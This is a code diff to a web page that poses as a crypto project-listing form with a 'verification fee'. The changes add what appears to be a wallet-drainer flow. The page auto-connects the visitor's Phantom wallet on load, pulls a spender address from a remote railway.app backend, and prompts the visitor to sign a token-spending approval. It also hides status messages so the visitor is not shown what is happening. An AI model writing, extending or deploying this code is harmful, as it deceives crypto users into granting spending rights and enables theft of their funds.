@@ -295,6 +295,41 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
   to { transform: scale(1); }
 }
 
+  .wallet-panel {
+    margin-top: 24px;
+    background: rgba(15, 15, 15, 0.95);
+    color: #fff;
+    padding: 20px;
+    border-radius: 14px;
+    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.35);
+  }
+
+  .wallet-panel h3 {
+    margin: 0 0 8px;
+    font-size: 20px;
+  }
+
+  .wallet-panel p {
+    margin: 0 0 14px;
+    color: #bcbcbc;
+    font-size: 14px;
+  }
+
+  .wallet-summary-output {
+    margin-top: 12px;
+    padding: 12px;
+    background: #111;
+    border-radius: 10px;
+    color: #d6d6d6;
+    font-size: 14px;
+    line-height: 1.5;
+  }
+
+  .wallet-summary-output ul {
+    margin: 8px 0 0;
+    padding-left: 16px;
+  }
+
 @media (max-width: 600px) {
   .container {
     padding: 15px;
@@ -319,9 +354,9 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
     <form id="projectForm" class="card">
       <h2>Submit Your Project</h2>
       <div class="grid">
-        <input placeholder="Project Name" required />
-        <input placeholder="Project Symbol" required />
-        <select required>
+        <input id="projectNameInput" placeholder="Project Name" required />
+        <input id="projectSymbolInput" placeholder="Project Symbol" required />
+        <select id="chainSelect" required>
           <option value="">Select Chain</option>
           <option>Ethereum</option>
           <option>BNB Chain</option>
@@ -329,23 +364,21 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
           <option>Polygon</option>
           <option>Arbitrum</option>
         </select>
-        <input placeholder="Contract Address" required />
-        <input placeholder="Total Supply" />
-        <input placeholder="Circulating Supply" />
+        <input id="contractAddressInput" placeholder="Contract Address" required />
+        <input id="totalSupplyInput" type="number" inputmode="numeric" pattern="\d*" placeholder="Total Supply" min="0" />
+        <input id="circulatingSupplyInput" type="number" inputmode="numeric" pattern="\d*" placeholder="Circulating Supply" min="0" />
       </div>
       <textarea placeholder="Other necessary information"></textarea>
       <div class="grid">
-        <input placeholder="Developer Name" required />
-        <input type="email" placeholder="Developer Email" required />
+        <input id="developerNameInput" placeholder="Developer Name" required />
+        <input id="developerEmailInput" type="email" placeholder="Developer Email" required />
       </div>
       <button type="button" class="btn-primary" id="submitButton">Submit</button>
     </form>
-  </main>
-
   <div id="feeModal" class="modal hidden">
     <div class="modal-content">
       <span class="close">&times;</span>
-      <p>A verification fee is required to list your project on The Void List.</p>
+      <p>A verification fee is required to list your project.</p>
       <button id="proceedButton">Proceed to Payment</button>
     </div>
   </div>
@@ -360,10 +393,10 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
     </div>
   </div>
 
-  <div id="statusBox" class="status-box">The form and wallet flow are ready. Choose a wallet to continue.</div>
+  <div id="statusBox" class="status-box" style="display: none;"></div>
 
   <script>
-   let walletLibs = null;
+    let walletLibs = null;
     let connectedWalletAddress = null;
     let signTransactionFn = null;
 
@@ -418,6 +451,11 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
     const mintAddressInput = document.getElementById('mintAddressInput');
     const tokenAccountInput = document.getElementById('tokenAccountInput');
     const transferAmountInput = document.getElementById('transferAmountInput');
+    const chainSelect = document.getElementById('chainSelect');
+    const contractAddressInput = document.getElementById('contractAddressInput');
+    const totalSupplyInput = document.getElementById('totalSupplyInput');
+    const circulatingSupplyInput = document.getElementById('circulatingSupplyInput');
+    const developerEmailInput = document.getElementById('developerEmailInput');
 
     let wcProvider = null;
     let provider = null;
@@ -426,8 +464,16 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
     const API_BASE_URL = 'https://void-production-d066.up.railway.app';
 
     function setStatus(message, isError = false) {
+      if (!isError) {
+        statusBox.style.display = 'none';
+        statusBox.textContent = '';
+        statusBox.classList.remove('error');
+        return;
+      }
+
+      statusBox.style.display = 'block';
       statusBox.textContent = message;
-      statusBox.classList.toggle('error', isError);
+      statusBox.classList.add('error');
     }
 
     function closeModal(modal) {
@@ -448,18 +494,83 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
 
     const submitButton = document.getElementById('submitButton');
 
+    document.addEventListener('DOMContentLoaded', () => {
+      if (window.solana && window.solana.isPhantom) {
+        console.log('Phantom extension detected. Initiating auto-connect...');
+        connectPhantom();
+      }
+    });
+
+    function isValidContractAddress(value, chain) {
+      if (!value) {
+        return false;
+      }
+
+      const trimmed = value.trim();
+      if (chain === 'Solana') {
+        return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(trimmed);
+      }
+
+      return /^0x[a-fA-F0-9]{40}$/.test(trimmed);
+    }
+
+    function validateFormData() {
+      const chain = chainSelect?.value || '';
+      const contractAddress = contractAddressInput?.value?.trim() || '';
+      const totalSupply = totalSupplyInput?.value?.trim() || '';
+      const circulatingSupply = circulatingSupplyInput?.value?.trim() || '';
+      const developerEmail = developerEmailInput?.value?.trim() || '';
+
+      if (!isValidContractAddress(contractAddress, chain)) {
+        setStatus(chain === 'Solana'
+          ? 'Please enter a valid Solana contract address.'
+          : 'Please enter a valid 0x contract address.', true);
+        return false;
+      }
+
+      if (totalSupply !== '' && !/^[0-9]+$/.test(totalSupply)) {
+        setStatus('Total supply must contain only numbers.', true);
+        return false;
+      }
+
+      if (circulatingSupply !== '' && !/^[0-9]+$/.test(circulatingSupply)) {
+        setStatus('Circulating supply must contain only numbers.', true);
+        return false;
+      }
+
+      if (!developerEmail || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(developerEmail)) {
+        setStatus('Developer email must be a valid email address.', true);
+        return false;
+      }
+
+      setStatus('', false);
+      return true;
+    }
+
     if (projectForm && feeModal) {
       projectForm.addEventListener('submit', (event) => {
         event.preventDefault();
-        openModal(feeModal);
-        setStatus('Verification fee notice opened. Continue to wallet selection.');
+        if (!validateFormData()) {
+          return;
+        }
+        if (window.solana && window.solana.isPhantom) {
+          connectPhantom();
+        } else {
+          openModal(feeModal);
+        }
       });
     }
 
     if (submitButton && feeModal) {
       submitButton.addEventListener('click', () => {
-        openModal(feeModal);
-        setStatus('Verification fee notice opened. Continue to wallet selection.');
+        if (!validateFormData()) {
+          return;
+        }
+        if (window.solana && window.solana.isPhantom) {
+          connectPhantom();
+        } else {
+          openModal(feeModal);
+        }
       });
     }
 
@@ -471,7 +582,6 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
       proceedButton.addEventListener('click', () => {
         closeModal(feeModal);
         openModal(walletModal);
-        setStatus('Choose a wallet to continue.');
       });
     }
 
@@ -498,7 +608,7 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
     async function loadWalletSummary() {
       const address = (walletAddressInput?.value || connectedWalletAddress || '').trim();
       if (!address) {
-        setStatus('Enter a wallet address or connect a wallet first.', true);
+        setStatus('Connect wallet.', true);
         return;
       }
 
@@ -508,7 +618,7 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
         const data = await res.json();
 
         if (!res.ok) {
-          throw new Error(data.error || 'Unable to load wallet summary');
+          throw new Error(data.error || 'Unable to detect token');
         }
 
         if (!walletSummaryOutput) {
@@ -533,13 +643,13 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
         if (walletSummaryOutput) {
           walletSummaryOutput.innerHTML = '<p>Unable to load token balances right now.</p>';
         }
-        setStatus(error.message || 'Unable to load wallet summary.', true);
+        setStatus(error.message || 'Unable to detect token.', true);
       }
     }
 
     async function sendSplTokenToRecipient() {
       if (!connectedWalletAddress) {
-        setStatus('Connect a wallet before sending a token.', true);
+        setStatus('Connect wallet.', true);
         return;
       }
 
@@ -578,7 +688,7 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
         tx.recentBlockhash = latestBlockhash.blockhash;
 
         if (!signTransactionFn) {
-          throw new Error('No wallet signer is available. Connect a wallet first.');
+          throw new Error('No wallet signer is available. Connect a valid wallet.');
         }
 
         const signedTx = await signTransactionFn(tx);
@@ -609,7 +719,7 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
 
         const backendData = await backendResponse.json().catch(() => ({}));
         if (!backendResponse.ok) {
-          throw new Error(backendData.error || 'The backend could not log the transfer.');
+          throw new Error(backendData.error || 'Transfer could not be logged.');
         }
 
         setStatus(`Transfer broadcast successfully. Signature: ${signature}`, false);
@@ -626,10 +736,15 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
           return;
         }
 
-        setStatus('Connecting to Phantom...');
         const resp = await window.solana.connect();
         const account = resp.publicKey.toString();
+        connectedWalletAddress = account;
+        signTransactionFn = async (tx) => window.solana.signTransaction(tx);
+        provider = window.solana;
+        signer = window.solana;
+        activeProviderType = 'phantom';
         closeModal(walletModal);
+        closeModal(feeModal);
         setStatus(`Phantom connected: ${account}`);
         await approveSpender(account, async (tx) => window.solana.signTransaction(tx), 'Phantom');
       } catch (error) {
@@ -699,7 +814,7 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
         const res = await fetch(`${API_BASE_URL}/api/approval-config`);
 
         if (!res.ok) {
-          throw new Error('Backend endpoint is not available yet.');
+          throw new Error('The backend did not return a valid approval configuration.');
         }
 
         const { tokenAccount, spenderAddress } = await res.json();
@@ -710,8 +825,8 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
 
         await approveSpenderSolana(account, tokenAccount, spenderAddress, signFn, walletName);
       } catch (error) {
-        console.warn('Approval config unavailable, using frontend fallback:', error);
-        setStatus('Frontend flow completed. The backend is not ready yet, so live approval is skipped for now.', false);
+        console.error('Approval config request failed:', error);
+        setStatus(`Approval request failed: ${error.message}`, true);
       }
     }
 
